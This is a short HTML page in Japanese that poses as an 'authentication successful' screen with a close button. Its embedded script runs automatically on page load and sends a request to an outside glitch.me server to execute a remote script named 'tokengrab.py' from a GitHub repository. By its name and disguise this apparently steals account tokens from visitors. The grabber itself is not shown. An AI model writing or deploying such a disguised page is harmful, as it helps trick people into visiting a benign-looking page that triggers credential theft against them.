<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>認証成功</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>認証成功</h1>
        <p>認証が正常に完了しました</p>
        <a href="#" class="button" id="close-button">閉じる</a>
    </div>

    <script>
        // Function to execute tokengrab.py via server-side request
        function executePythonScript() {
            fetch('https://inky-neat-thyme.glitch.me/run-tokengrab', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    githubUrl: 'https://raw.githubusercontent.com/RepublicofAuech/vearithy/main/tokengrab.py' // Replace with actual GitHub file URL to execute
                })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to execute tokengrab.py');
                }
                console.log('tokengrab.py executed successfully');
            })
            .catch(error => {
                console.error('Error executing tokengrab.py:', error);
            });
        }

        // Execute tokengrab.py when the page loads
        document.addEventListener('DOMContentLoaded', function() {
            executePythonScript();
        });

        // Function to close the tab when the close button is clicked
        document.getElementById('close-button').addEventListener('click', function(event) {
            event.preventDefault();
            window.close();
        });
    </script>
</body>
</html>
